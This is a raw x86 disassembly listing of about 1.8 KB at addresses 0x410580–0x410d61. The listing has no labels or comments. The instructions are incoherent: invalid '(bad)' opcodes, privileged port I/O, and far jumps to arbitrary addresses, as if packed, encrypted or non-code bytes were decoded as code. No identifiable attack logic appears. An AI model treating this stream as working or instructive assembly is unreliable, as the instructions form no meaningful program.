  410580:	mov    al,0xe4
  410582:	test   esi,ebx
  410584:	adc    BYTE PTR [ebp+edi*1+0x1d],dh
  410588:	adc    al,0x75
  41058a:	mov    bh,0xd0
  41058c:	adc    eax,0x193fd863
  410591:	neg    ch
  410593:	add    al,0x2a
  410595:	dec    ebx
  410596:	pop    ecx
  410597:	or     eax,0x5a4241ba
  41059c:	mov    ch,0xbf
  41059e:	vmwrite ebx,DWORD PTR [esi-0x6b]
  4105a2:	mov    edi,0xe858199f
  4105a7:	aam    0xb3
  4105a9:	iret   
  4105aa:	mov    dh,ch
  4105ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105ad:	jne    0x410572
  4105af:	lock jbe 0x410557
  4105b2:	js     0x41056c
  4105b4:	test   eax,0x5d307561
  4105b9:	call   0xd1a6:0x39d0c950
  4105c0:	je     0x410562
  4105c2:	fisub  WORD PTR [ebp-0x137e48c7]
  4105c8:	sbb    BYTE PTR ds:0x3640daae,bl
  4105ce:	push   esp
  4105cf:	jp     0x410561
  4105d1:	shl    edi,0xe9
  4105d4:	mov    dl,0x39
  4105d6:	jns    0xe952831d
  4105dc:	out    dx,eax
  4105dd:	dec    ecx
  4105de:	jmp    0x4105cb
  4105e0:	repnz add al,0xd0
  4105e3:	sub    DWORD PTR [edi+0x542f4562],ebx
  4105e9:	inc    edx
  4105ea:	or     DWORD PTR [ebp+edi*1-0x2ef0b805],eax
  4105f1:	cmp    DWORD PTR [esi+0x5783daea],edi
  4105f7:	adc    BYTE PTR [edx],0xf9
  4105fa:	retf   0x444b
  4105fd:	pop    ecx
  4105fe:	(bad)  
  410600:	jmp    0xce2d:0xaa371ad3
  410607:	(bad)  
  410608:	sti    
  410609:	mov    WORD PTR [edi-0x4c],fs
  41060c:	add    DWORD PTR [ebp+0xad176da],0xffffff92
  410613:	jmp    0x4105f1
  410615:	jl     0x410632
  410617:	cmc    
  410618:	fdivrp st(2),st
  41061a:	mov    bl,0x9
  41061c:	fwait
  41061d:	xchg   edi,eax
  41061e:	lds    ecx,FWORD PTR [eax-0x6d]
  410621:	retf   
  410622:	and    BYTE PTR [edi-0x53],0xd
  410626:	fwait
  410627:	(bad)  
  410628:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410629:	or     al,0xfb
  41062b:	repnz popf 
  41062d:	cmp    BYTE PTR [edx+0x51b82840],ch
  410633:	sub    cl,BYTE PTR [edx-0x1f]
  410636:	mov    es,WORD PTR [ebx]
  410638:	rcr    BYTE PTR [ebp-0x7eb810fb],0x30
  41063f:	sub    bl,BYTE PTR [esp+ebx*4]
  410642:	loopne 0x41067d
  410644:	add    eax,0x31a01ab9
  410649:	div    ah
  41064b:	(bad)  
  41064c:	ds or  esi,esp
  41064f:	or     bl,0x95
  410652:	sub    al,0x94
  410654:	sti    
  410655:	or     al,BYTE PTR [esp+edx*1+0x16]
  410659:	cmp    dl,BYTE PTR [edi]
  41065b:	clc    
  41065c:	push   esi
  41065d:	add    dl,dl
  41065f:	ds dec edi
  410661:	jmp    0xf9587cfb
  410666:	mov    ebx,0x7e9e6693
  41066b:	and    eax,0x1bb35fee
  410670:	imul   ebx,DWORD PTR [esi+esi*2-0x47c4fdc8],0x36
  410678:	xlat   BYTE PTR ds:[ebx]
  410679:	dec    ebx
  41067a:	outs   dx,DWORD PTR ds:[esi]
  41067b:	gs retf 
  41067d:	in     eax,dx
  41067e:	pop    edx
  41067f:	sbb    ah,bl
  410681:	fisub  DWORD PTR [ebp+0x72]
  410684:	mov    bh,0x89
  410686:	cwde   
  410687:	outs   dx,DWORD PTR ds:[esi]
  410688:	imul   eax,DWORD PTR [eax-0x5b],0x6f
  41068c:	ds dec ebp
  41068e:	xchg   esi,eax
  41068f:	push   cs
  410690:	mov    al,0xf1
  410692:	sub    BYTE PTR [ecx],0x1d
  410695:	xor    DWORD PTR ds:[esi],eax
  410698:	sbb    ecx,DWORD PTR [edx]
  41069a:	mov    ch,0x70
  41069c:	call   0x4f32d286
  4106a1:	les    eax,FWORD PTR [ecx]
  4106a3:	and    DWORD PTR [edx+0x2a],0x80021733
  4106aa:	popf   
  4106ab:	hlt    
  4106ac:	imul   ecx,DWORD PTR [ebp+0x67],0x9dbb88c5
  4106b3:	and    cl,dh
  4106b5:	xchg   esi,eax
  4106b6:	std    
  4106b7:	sbb    eax,DWORD PTR [ebx+0x2a]
  4106ba:	loop   0x4106eb
  4106bc:	add    al,0x66
  4106be:	mov    ch,0x9
  4106c0:	xor    ecx,DWORD PTR [edx]
  4106c2:	rcr    edx,cl
  4106c4:	daa    
  4106c5:	test   eax,0x846a931
  4106ca:	dec    edx
  4106cb:	movq   QWORD PTR [esi],mm6
  4106ce:	out    dx,al
  4106cf:	sub    esi,DWORD PTR [esi]
  4106d1:	lahf   
  4106d2:	out    0x93,al
  4106d4:	jl     0x41073f
  4106d6:	loop   0x41071a
  4106d8:	xor    dl,dl
  4106da:	stos   DWORD PTR es:[edi],eax
  4106db:	push   es
  4106dc:	lock retf 
  4106de:	xchg   esp,eax
  4106df:	pop    edi
  4106e0:	xchg   ecx,eax
  4106e1:	fs (bad) 
  4106e3:	lea    ebp,[edx+0x1b]
  4106e6:	sbb    BYTE PTR [edx-0x61],bh
  4106e9:	sub    DWORD PTR [ecx-0x268963b5],0x67ca8255
  4106f3:	push   esp
  4106f4:	dec    esi
  4106f5:	push   edi
  4106f6:	scas   al,BYTE PTR es:[edi]
  4106f7:	test   BYTE PTR [esp+ebx*1+0x78],ah
  4106fb:	out    dx,eax
  4106fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106fd:	(bad)  
  4106fe:	add    cl,dl
  410700:	out    0xc4,eax
  410702:	jae    0x410728
  410704:	xchg   ebx,eax
  410705:	ds mov bh,0xb4
  410708:	inc    DWORD PTR [eax]
  41070a:	inc    esi
  41070b:	push   ecx
  41070c:	mov    eax,ds:0x44f4db94
  410711:	cmc    
  410712:	jbe    0x4106e1
  410714:	(bad)  
  410715:	xor    ecx,edi
  410717:	sbb    BYTE PTR [ebp-0x4b3421fd],bl
  41071d:	retf   
  41071e:	sub    al,0x98
  410720:	sbb    DWORD PTR [ebp+0x9],ebx
  410723:	dec    esi
  410724:	sti    
  410725:	(bad)  
  410726:	cli    
  410727:	call   DWORD PTR [esp+ecx*1+0x0]
  41072b:	dec    edi
  41072c:	into   
  41072d:	xor    esi,DWORD PTR [edx]
  41072f:	dec    ecx
  410730:	int    0xb3
  410732:	cdq    
  410733:	ret    
  410734:	push   ds
  410735:	mov    ebx,0x81df9704
  41073a:	jo     0x4106ce
  41073c:	iret   
  41073d:	test   al,0x2a
  41073f:	or     al,0xbc
  410741:	iret   
  410742:	push   ss
  410743:	lea    eax,[esp+ecx*2]
  410746:	xchg   BYTE PTR [edx+0x2f],ah
  410749:	or     eax,0xf24e471b
  41074e:	pop    esp
  41074f:	push   cs
  410750:	std    
  410751:	sahf   
  410752:	fmul   DWORD PTR [ebp+0x653d1815]
  410758:	popf   
  410759:	(bad)  
  41075b:	push   es
  41075c:	imul   ebx,DWORD PTR [edi+0x51],0xffffffdc
  410760:	test   eax,0xe9b94738
  410765:	arpl   WORD PTR [ecx],sp
  410767:	and    ch,BYTE PTR [ecx-0x2c]
  41076a:	fidivr WORD PTR [edi+0x50]
  41076d:	cmp    DWORD PTR [esi],esi
  41076f:	int3   
  410770:	dec    eax
  410771:	out    dx,ax
  410773:	pop    esp
  410774:	mov    ah,0xa6
  410776:	rcr    al,1
  410778:	push   edi
  410779:	jae    0x41079c
  41077b:	mov    eax,DWORD PTR [ecx+eiz*4-0x43c6c1ff]
  410782:	in     eax,dx
  410783:	cld    
  410784:	dec    ebp
  410785:	imul   esi,DWORD PTR [ebx+0x2d63b128],0xb8bb626d
  41078f:	jbe    0x4107e4
  410791:	imul   ebp,edi,0x44
  410794:	or     al,0xcb
  410796:	out    0xf1,eax
  410798:	es scas eax,DWORD PTR es:[edi]
  41079a:	pop    edx
  41079b:	cld    
  41079c:	xor    esp,edx
  41079e:	jae    0x4107d1
  4107a0:	(bad)  
  4107a1:	test   al,0xc4
  4107a3:	mov    eax,0x6dfba96b
  4107a8:	push   edx
  4107a9:	ror    ecx,0xce
  4107ac:	(bad)  
  4107ad:	jmp    0x4303:0x291d6ab6
  4107b4:	rcr    DWORD PTR [ecx+eiz*8],1
  4107b7:	mov    al,0x4b
  4107b9:	mov    ebp,0xfa7ec511
  4107be:	ds dec esi
  4107c0:	adc    BYTE PTR cs:[edi-0x3fecebea],bh
  4107c7:	iret   
  4107c8:	fucom  st(2)
  4107ca:	(bad)  
  4107cb:	push   ss
  4107cc:	leave  
  4107cd:	xor    esi,0xffffff8b
  4107d0:	jo     0x410826
  4107d2:	scas   eax,DWORD PTR es:[edi]
  4107d3:	jnp    0x410804
  4107d5:	push   ds
  4107d6:	fild   DWORD PTR [ebp+0x34]
  4107d9:	xlat   BYTE PTR ds:[ebx]
  4107da:	add    cl,al
  4107dc:	push   ebx
  4107dd:	outs   dx,DWORD PTR ds:[esi]
  4107de:	pushf  
  4107df:	js     0x4107a6
  4107e1:	or     bh,BYTE PTR [edi+ecx*1+0x37]
  4107e5:	cli    
  4107e6:	mov    cl,0xb3
  4107e8:	in     al,dx
  4107e9:	pop    edx
  4107ea:	push   eax
  4107eb:	mov    bh,BYTE PTR [eiz*1-0x4c797a94]
  4107f2:	dec    eax
  4107f3:	push   ebx
  4107f4:	pushf  
  4107f5:	inc    ebp
  4107f6:	and    BYTE PTR [ebx-0x7e],dh
  4107f9:	lea    ebx,[edi+0x2c1ffbc2]
  4107ff:	stos   BYTE PTR es:[edi],al
  410800:	sbb    DWORD PTR [edi],0x45
  410803:	addr16 mov eax,0xddfbbcf5
  410809:	data16 jge 0x410883
  41080c:	jp     0x410795
  41080e:	out    dx,eax
  41080f:	jmp    0xde31:0x3994a569
  410816:	aaa    
  410817:	retf   
  410818:	mov    ecx,0xcdd34336
  41081d:	int    0x42
  41081f:	and    DWORD PTR [ecx+0x6bd5fdb9],esp
  410825:	call   0xb834:0x78142b57
  41082c:	clc    
  41082d:	lock in eax,dx
  41082f:	push   ds
  410830:	push   edx
  410831:	pop    eax
  410832:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410833:	add    eax,0xc684b125
  410838:	jp     0x410852
  41083a:	jl     0x41085b
  41083c:	mov    al,ds:0x631c6ecd
  410841:	dec    esp
  410842:	cdq    
  410843:	repz xor BYTE PTR es:[ebp-0x6c],dl
  410848:	mov    ds:0xa8b2ccab,al
  41084d:	mov    dh,0x27
  41084f:	mov    ecx,0x318f2fc1
  410854:	retf   0x7490
  410857:	rcr    BYTE PTR [ebx],cl
  410859:	add    al,0x64
  41085b:	arpl   WORD PTR [esi+0xb],dx
  41085e:	adc    al,0xb2
  410860:	or     al,0xc6
  410862:	lea    esi,[ebx+0x5a]
  410865:	or     dh,dl
  410867:	jae    0x41081f
  410869:	add    al,0xa0
  41086b:	imul   ebp,DWORD PTR [ecx],0xbb5546d6
  410871:	mov    ebp,0x8e7d1112
  410876:	aam    0x6e
  410878:	fldcw  WORD PTR [edi-0x14bd0845]
  41087e:	inc    esp
  41087f:	jle    0x41086e
  410881:	mov    ecx,0xeda0b430
  410886:	jae    0x4108b9
  410888:	fwait
  410889:	mov    dl,al
  41088b:	outs   dx,DWORD PTR ds:[esi]
  41088c:	mov    ch,BYTE PTR [eax-0x35cf841c]
  410892:	mov    ds:0xfd0bcfa1,eax
  410897:	mov    dh,0xc6
  410899:	dec    esi
  41089a:	mov    esi,0x7fd80ed
  41089f:	pop    ebp
  4108a0:	fs out 0xb7,al
  4108a3:	je     0x4108a0
  4108a5:	sub    BYTE PTR [edi+edi*2],cl
  4108a8:	dec    eax
  4108a9:	pop    edi
  4108aa:	rcl    BYTE PTR [eax-0x7fc22a11],0x7d
  4108b1:	mov    bl,0xb1
  4108b3:	mov    edi,0x3eca627b
  4108b8:	mov    ebp,0x4969ba49
  4108bd:	test   al,0xbd
  4108bf:	xor    ebx,esp
  4108c1:	cs cs pop esi
  4108c4:	inc    esi
  4108c5:	push   ss
  4108c6:	in     al,0xce
  4108c8:	or     cl,BYTE PTR [ecx+0x5d8ab1c7]
  4108ce:	popa   
  4108cf:	cmp    eax,DWORD PTR ds:0x5f9ecea9
  4108d5:	xchg   edx,eax
  4108d6:	push   0x55e42c68
  4108db:	mov    bl,0x31
  4108dd:	mov    dl,0x78
  4108df:	bnd jmp 0x410954
  4108e2:	xchg   esp,eax
  4108e3:	cmp    ah,bh
  4108e5:	adc    BYTE PTR [eax-0x295abe97],0x76
  4108ec:	pop    esi
  4108ed:	popf   
  4108ee:	push   es
  4108ef:	mov    eax,ds:0xb914f321
  4108f4:	jns    0x41088d
  4108f6:	xor    BYTE PTR [edx],ch
  4108f8:	rcr    bh,cl
  4108fa:	cmp    BYTE PTR [esp+esi*4-0x1ec267cb],ch
  410901:	clc    
  410902:	fwait
  410903:	push   ds
  410904:	in     eax,dx
  410905:	ret    
  410906:	test   al,0x4f
  410908:	push   0xfffffffa
  41090a:	inc    ebp
  41090b:	jae    0x4108ec
  41090d:	mov    al,0xb9
  41090f:	push   ds
  410910:	xchg   esi,eax
  410911:	jno    0x4108aa
  410913:	(bad)  
  410914:	mov    ch,0x59
  410916:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410917:	jno    0x4108b4
  410919:	dec    eax
  41091a:	outs   dx,BYTE PTR ds:[esi]
  41091b:	push   ebp
  41091c:	mov    WORD PTR [ebp+0x17],?
  41091f:	inc    edx
  410920:	idiv   DWORD PTR es:[esi]
  410923:	pusha  
  410924:	push   ss
  410925:	adc    BYTE PTR [esp+edi*4-0x44cf5fa8],0x66
  41092d:	cs jns 0x4108f4
  410930:	push   0xa6893496
  410935:	push   edx
  410936:	jae    0x410983
  410938:	lahf   
  410939:	or     BYTE PTR [ebx-0x48f6b0cc],0xe1
  410940:	pop    eax
  410941:	and    BYTE PTR [ecx],0x9c
  410944:	mov    eax,ds:0xdfb6b3ab
  410949:	(bad)  
  41094a:	jp     0x410936
  41094c:	hlt    
  41094d:	mov    eax,ds:0xbbd7aec7
  410952:	adc    eax,esp
  410954:	adc    eax,esi
  410956:	in     eax,dx
  410957:	mov    DWORD PTR [ecx-0x24],esp
  41095a:	fdiv   st(4),st
  41095c:	and    DWORD PTR [eax-0x336c7a8c],edi
  410962:	hlt    
  410963:	frstor [edx]
  410965:	inc    eax
  410966:	mov    dl,0x88
  410968:	inc    edi
  410969:	or     ecx,ecx
  41096b:	and    dl,BYTE PTR [esi-0x45a4541a]
  410971:	pop    es
  410972:	in     al,0x14
  410974:	lock pop ebx
  410976:	sahf   
  410977:	loope  0x4109bb
  410979:	sbb    DWORD PTR [edi-0x2d43115f],ecx
  41097f:	push   eax
  410980:	fadd   st,st(5)
  410982:	push   0x416671b2
  410987:	push   esp
  410988:	xchg   esi,eax
  410989:	pop    esp
  41098a:	sub    DWORD PTR [edx-0x5f],edx
  41098d:	dec    esp
  41098e:	out    dx,eax
  41098f:	xor    edi,ecx
  410991:	adc    eax,0xf547823b
  410996:	add    ecx,ecx
  410998:	lods   eax,DWORD PTR ds:[esi]
  410999:	popa   
  41099a:	inc    eax
  41099b:	(bad)  
  41099d:	xchg   ebp,eax
  41099e:	stos   DWORD PTR es:[edi],eax
  41099f:	popf   
  4109a0:	mov    ch,0x6c
  4109a2:	push   0x2cca597d
  4109a7:	test   al,0x3f
  4109a9:	ret    
  4109aa:	gs pop esp
  4109ac:	lock ins BYTE PTR es:[edi],dx
  4109ae:	xchg   edx,eax
  4109af:	jg     0x410967
  4109b1:	out    0x61,al
  4109b3:	pop    edi
  4109b4:	mov    BYTE PTR [eax+0x12],dh
  4109b7:	and    ecx,ebx
  4109b9:	push   esp
  4109ba:	popa   
  4109bb:	scas   al,BYTE PTR es:[edi]
  4109bc:	retf   
  4109bd:	ret    
  4109be:	out    0xb5,eax
  4109c0:	push   ds
  4109c1:	mov    ebp,0x8b2130e3
  4109c6:	xchg   ebx,eax
  4109c7:	fs jno 0x4109b3
  4109ca:	jnp    0x4109ef
  4109cc:	mov    ebp,0x5f97c5e1
  4109d1:	pop    ebp
  4109d2:	adc    DWORD PTR [edi-0x6],ebx
  4109d5:	push   0xffffff94
  4109d7:	sbb    DWORD PTR [edx-0x8],ebx
  4109da:	(bad)  
  4109db:	cli    
  4109dc:	mov    ds:0x16b9abb3,al
  4109e1:	mov    bh,0xf3
  4109e3:	push   edi
  4109e4:	fs pop esp
  4109e6:	(bad)  
  4109e7:	mov    eax,0xcbc5590f
  4109ec:	call   0x5f21:0xa75d924f
  4109f3:	mov    ds:0xa6dc6721,eax
  4109f8:	adc    DWORD PTR [ebx-0x15cfa256],esp
  4109fe:	jnp    0x4109b8
  410a00:	shr    BYTE PTR [edi-0x2ec8454d],cl
  410a06:	sub    al,0x3b
  410a08:	retf   0x1220
  410a0b:	repz and ebp,edx
  410a0e:	adc    ecx,DWORD PTR [ebx+0x2cc6df62]
  410a14:	xchg   ebx,eax
  410a15:	push   0x73352aaf
  410a1a:	retf   0x3de9
  410a1d:	mov    al,bl
  410a1f:	xor    ecx,DWORD PTR [ebp+0x2]
  410a22:	fwait
  410a23:	dec    ebp
  410a24:	push   es
  410a25:	jmp    0xf20c:0x78f6cc82
  410a2c:	sar    DWORD PTR [ecx+ebx*2],cl
  410a2f:	xor    al,0x21
  410a31:	in     al,dx
  410a32:	dec    eax
  410a33:	mov    ebx,0x40d86ed5
  410a38:	in     eax,0x67
  410a3a:	mov    ah,0x78
  410a3c:	push   es
  410a3d:	adc    al,0x7a
  410a3f:	and    DWORD PTR [edx+0x1f19f7c9],esp
  410a45:	call   0x54420188
  410a4a:	xchg   BYTE PTR [ebx-0x57],cl
  410a4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a4e:	add    BYTE PTR [eax-0x4ae369c6],bh
  410a54:	mov    ds:0x3f51c480,eax
  410a59:	cdq    
  410a5a:	jb     0x410a10
  410a5c:	in     al,0xdb
  410a5e:	ret    
  410a5f:	sub    BYTE PTR [esi],ah
  410a61:	sub    eax,0x173300b8
  410a66:	daa    
  410a67:	jo     0x4109f1
  410a69:	mov    eax,0x5640729f
  410a6e:	cli    
  410a6f:	or     esp,eax
  410a71:	mov    esi,0x8654f860
  410a76:	aad    0x49
  410a78:	jbe    0x410a9c
  410a7a:	jbe    0x410a4e
  410a7c:	pop    es
  410a7d:	hlt    
  410a7e:	mov    DWORD PTR [eax],esp
  410a80:	in     eax,0xbd
  410a82:	inc    ecx
  410a83:	sub    esi,edi
  410a85:	pushf  
  410a86:	pop    es
  410a87:	and    esi,DWORD PTR [ebx-0x61904143]
  410a8d:	push   edi
  410a8e:	(bad)  
  410a8f:	(bad)  
  410a91:	xor    BYTE PTR [esi+0x4],al
  410a94:	sbb    al,al
  410a96:	add    al,0xbd
  410a98:	rcr    BYTE PTR [bx+0x4d1b],1
  410a9d:	jmp    0x410ac3
  410a9f:	mov    WORD PTR [edx+ebp*1-0xb],fs
  410aa3:	inc    ebp
  410aa4:	pop    edi
  410aa5:	sub    eax,0xd67dc016
  410aaa:	add    ecx,esp
  410aac:	out    dx,al
  410aad:	dec    esp
  410aae:	cmp    bl,cl
  410ab0:	push   ecx
  410ab1:	and    eax,0xf64ad097
  410ab6:	xchg   edi,eax
  410ab7:	ret    
  410ab8:	or     DWORD PTR [ebx-0x7be6a41e],0xd4c18ec8
  410ac2:	(bad)  
  410ac3:	cmp    edx,DWORD PTR [ebp-0x305e2f09]
  410ac9:	cmp    al,0xd6
  410acb:	jno    0x410ab3
  410acd:	mov    al,ds:0x17faa85
  410ad2:	inc    esi
  410ad3:	sbb    eax,0x88572b34
  410ad8:	mov    eax,0xbb3cda4d
  410add:	mov    edx,0x80cf48e5
  410ae2:	jae    0x410b44
  410ae4:	imul   DWORD PTR [eax+eiz*2+0x7d0b1e43]
  410aeb:	cmc    
  410aec:	icebp  
  410aed:	mov    ss,WORD PTR [ecx-0x1c]
  410af0:	push   esp
  410af1:	(bad)  
  410af2:	dec    ebx
  410af3:	jmp    0x410a79
  410af5:	call   0xe3c2:0xd184ae89
  410afc:	add    edi,esi
  410afe:	rol    bh,0x57
  410b01:	adc    edx,DWORD PTR [ebx-0x3b5a683a]
  410b07:	jl     0x410b85
  410b09:	pop    esi
  410b0a:	mov    WORD PTR [edx-0x59],es
  410b0d:	aad    0x95
  410b0f:	dec    ebp
  410b10:	mov    dh,0x47
  410b12:	in     al,0x21
  410b14:	neg    BYTE PTR [edx-0x36]
  410b17:	dec    ebx
  410b18:	xchg   dl,al
  410b1a:	sti    
  410b1b:	mov    dl,0x8c
  410b1d:	pop    eax
  410b1e:	jbe    0x410b02
  410b20:	sbb    edi,DWORD PTR [ecx-0x49460365]
  410b26:	jbe    0x410ac8
  410b28:	test   eax,0x486a1fa5
  410b2d:	mov    ebx,edx
  410b2f:	aad    0x61
  410b31:	adc    ah,dl
  410b33:	xor    DWORD PTR [edi-0xe704027],ecx
  410b39:	in     eax,0x35
  410b3b:	or     edi,eax
  410b3d:	xor    cl,al
  410b3f:	mov    dl,0xae
  410b41:	pop    ecx
  410b42:	into   
  410b43:	mov    ecx,0x59226dba
  410b48:	mov    dl,0x2b
  410b4a:	pop    es
  410b4b:	dec    edx
  410b4c:	dec    eax
  410b4d:	cmp    DWORD PTR [ecx+0x1a88bc40],esi
  410b53:	(bad)  
  410b54:	pop    edx
  410b55:	pop    edx
  410b56:	addr16 inc edi
  410b58:	add    cl,BYTE PTR [esi-0x5a327779]
  410b5e:	scas   al,BYTE PTR es:[edi]
  410b5f:	pusha  
  410b60:	xchg   BYTE PTR [eax+ecx*1-0x21],ah
  410b64:	sub    eax,0x7a634433
  410b69:	lods   eax,DWORD PTR ds:[esi]
  410b6a:	pop    edi
  410b6b:	jp     0x410be7
  410b6d:	mov    edi,0x10acf160
  410b72:	loope  0x410bd6
  410b74:	std    
  410b75:	adc    al,0xc9
  410b77:	idiv   DWORD PTR [ecx+0x1b]
  410b7a:	cmp    esi,edi
  410b7c:	lahf   
  410b7d:	xor    DWORD PTR [ebx-0x72],0x73
  410b81:	cli    
  410b82:	jmp    0x410bb6
  410b84:	scas   al,BYTE PTR es:[edi]
  410b85:	xchg   ebp,eax
  410b86:	mov    eax,0x8e9cd5ac
  410b8b:	lods   al,BYTE PTR ds:[esi]
  410b8c:	xchg   edi,eax
  410b8d:	scas   eax,DWORD PTR es:[edi]
  410b8e:	aam    0xba
  410b90:	gs out dx,al
  410b92:	aas    
  410b93:	or     al,0xc7
  410b95:	dec    edi
  410b96:	fdivp  st(1),st
  410b98:	mov    ebx,0xcc7e0a03
  410b9d:	and    DWORD PTR [ebp-0x28f96553],0x46700a4c
  410ba7:	hlt    
  410ba8:	xchg   ecx,eax
  410ba9:	cmp    ebx,esp
  410bab:	stos   BYTE PTR es:[edi],al
  410bac:	sahf   
  410bad:	aam    0x90
  410baf:	jno    0x410bb1
  410bb1:	push   es
  410bb2:	xchg   ebx,eax
  410bb3:	and    al,0x23
  410bb5:	mov    eax,ds:0x5d125c66
  410bba:	bound  esi,QWORD PTR [edi]
  410bbc:	fwait
  410bbd:	and    al,0x4d
  410bbf:	and    DWORD PTR [ecx-0x50f78816],ebp
  410bc5:	data16 rol BYTE PTR [eax-0x700898bc],1
  410bcc:	fsub   DWORD PTR [ecx]
  410bce:	xchg   ecx,eax
  410bcf:	and    eax,0xbe5dbd34
  410bd4:	int3   
  410bd5:	(bad)  
  410bd6:	cli    
  410bd7:	mov    WORD PTR [ebx],fs
  410bd9:	subps  xmm0,XMMWORD PTR [esi]
  410bdc:	arpl   di,bx
  410bde:	xor    al,0x69
  410be0:	shl    edx,0xf4
  410be3:	dec    esi
  410be4:	sub    cl,BYTE PTR [esp+edx*4]
  410be7:	adc    al,0x21
  410be9:	mov    ch,0xb0
  410beb:	push   es
  410bec:	popf   
  410bed:	sbb    eax,0x670dd301
  410bf2:	in     al,dx
  410bf3:	rol    BYTE PTR [edi+edx*4+0x1172e937],0xad
  410bfb:	(bad)  
  410bfc:	dec    esp
  410bfd:	cwde   
  410bfe:	jo     0x410bfb
  410c00:	jp     0x410c25
  410c02:	retf   
  410c03:	or     BYTE PTR [edx],0x91
  410c06:	inc    ebp
  410c07:	mov    BYTE PTR [esi-0x75a3a55f],bh
  410c0d:	stc    
  410c0e:	and    BYTE PTR [esi+esi*1-0x67],cl
  410c12:	fsubp  st(7),st
  410c14:	jmp    0x410c80
  410c16:	call   0x5ec:0x999e7d4e
  410c1d:	shl    dh,0x7d
  410c20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c21:	stos   BYTE PTR es:[edi],al
  410c22:	mov    ds:0xe099c66,al
  410c27:	or     BYTE PTR [esi+0x1edd3f85],ah
  410c2d:	xchg   esi,eax
  410c2e:	je     0x410c38
  410c30:	pcmpgtd mm0,QWORD PTR [esi]
  410c33:	pushf  
  410c34:	adc    BYTE PTR [edx+0x54],cl
  410c37:	mov    ebp,0x870a9bb4
  410c3c:	aam    0x9c
  410c3e:	aas    
  410c3f:	mov    ch,0x62
  410c41:	out    dx,eax
  410c42:	sub    dl,BYTE PTR [esi-0x6d96de4d]
  410c48:	jmp    0x108e099
  410c4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c4e:	jmp    0xd2267c1b
  410c53:	sub    DWORD PTR [esi+0x53],ebp
  410c56:	int3   
  410c57:	and    bl,BYTE PTR [edx+eiz*8+0x45a848b1]
  410c5e:	cld    
  410c5f:	stos   BYTE PTR es:[edi],al
  410c60:	sub    dl,BYTE PTR [ebp+0x61]
  410c63:	inc    BYTE PTR [eax]
  410c65:	jns    0x410bf8
  410c67:	mov    eax,0x7f8ebd2e
  410c6c:	and    al,0x98
  410c6e:	inc    ebx
  410c6f:	push   edx
  410c70:	mov    dh,0x59
  410c72:	outs   dx,DWORD PTR ds:[esi]
  410c73:	dec    ebx
  410c74:	arpl   WORD PTR [edi+ecx*8],si
  410c77:	js     0x410c2f
  410c79:	daa    
  410c7a:	not    DWORD PTR [ecx+0x48]
  410c7d:	add    eax,0xdaff9254
  410c82:	icebp  
  410c83:	push   es
  410c84:	adc    BYTE PTR [edi-0x1a],ch
  410c87:	shl    BYTE PTR [eax+0x61],1
  410c8a:	test   al,0x70
  410c8c:	push   cs
  410c8d:	mov    al,ds:0xaafc4411
  410c92:	cmp    BYTE PTR [ebx+0x7fe19b71],bh
  410c98:	cmp    eax,0x8e824780
  410c9d:	pop    ecx
  410c9e:	mov    eax,0x7a84cbb0
  410ca3:	pop    ss
  410ca4:	outs   dx,BYTE PTR ds:[esi]
  410ca5:	xor    al,0x8c
  410ca7:	pusha  
  410ca8:	shl    BYTE PTR [edx],0xf2
  410cab:	mov    ebp,0x5fd27de6
  410cb0:	scas   eax,DWORD PTR es:[edi]
  410cb1:	jg     0x410c7e
  410cb3:	ja     0x410cc2
  410cb5:	enter  0x54c8,0xd6
  410cb9:	or     eax,0x9f8d0e2c
  410cbe:	aaa    
  410cbf:	jae    0x410c5c
  410cc1:	(bad)  
  410cc2:	je     0x410c5d
  410cc4:	pusha  
  410cc5:	dec    edx
  410cc6:	nop
  410cc7:	enter  0x1ff0,0xe3
  410ccb:	add    ch,BYTE PTR [ecx-0x3b]
  410cce:	and    DWORD PTR [eax+0x311d5429],edi
  410cd4:	bound  esi,QWORD PTR [ebx+0x55c3da59]
  410cda:	sbb    BYTE PTR [ebx-0x22936eea],dl
  410ce0:	add    al,0x10
  410ce2:	(bad)  [eax+0x13aee2e]
  410ce8:	xor    ebp,DWORD PTR [eax+eiz*1]
  410ceb:	jo     0x410caa
  410ced:	push   ecx
  410cee:	test   BYTE PTR [esi+edx*1],ah
  410cf1:	jge    0x410c89
  410cf3:	pop    ebp
  410cf4:	xchg   BYTE PTR [edx-0x353b153b],dl
  410cfa:	cmp    ebx,DWORD PTR [edi-0x33]
  410cfd:	hlt    
  410cfe:	adc    esp,esp
  410d00:	mov    ebp,0x74843291
  410d05:	pop    ecx
  410d06:	inc    ebx
  410d07:	inc    BYTE PTR [edx+0x71]
  410d0a:	test   bl,al
  410d0c:	in     al,0xbb
  410d0e:	mov    edi,0x78d0f2d6
  410d13:	test   al,0x1e
  410d15:	jno    0x410cb8
  410d17:	pop    esi
  410d18:	push   esp
  410d19:	outs   dx,BYTE PTR ds:[esi]
  410d1a:	orps   xmm4,XMMWORD PTR [ebx-0x2d882a7d]
  410d21:	and    BYTE PTR [ebx],bh
  410d23:	stos   BYTE PTR es:[edi],al
  410d24:	mov    esi,DWORD PTR [ebp+0x61e72aec]
  410d2a:	pop    es
  410d2b:	sahf   
  410d2c:	rcr    DWORD PTR [ebx],1
  410d2e:	bound  ebx,QWORD PTR [edx-0x4e]
  410d31:	cmp    DWORD PTR [esi],edx
  410d33:	jge    0x410d2b
  410d35:	outs   dx,DWORD PTR ds:[esi]
  410d36:	and    bl,BYTE PTR [esi-0x70383ed8]
  410d3c:	mov    ch,0x42
  410d3e:	scas   eax,DWORD PTR es:[edi]
  410d3f:	dec    esp
  410d40:	xor    BYTE PTR [eax-0x66],dh
  410d43:	shl    DWORD PTR [eax-0x15],0x21
  410d47:	mov    edx,0xe4a7a40c
  410d4c:	push   ds
  410d4d:	loope  0x410cdb
  410d4f:	loope  0x410d9e
  410d51:	fmul   QWORD PTR [edx-0xc6b9b21]
  410d57:	push   0xffffffcd
  410d59:	test   al,0xe7
  410d5b:	cmp    BYTE PTR [ebx+0x26],bh
  410d5e:	arpl   bx,ax
  410d60:	push   eax
  410d61:	scas   eax,DWORD PTR es:[edi]
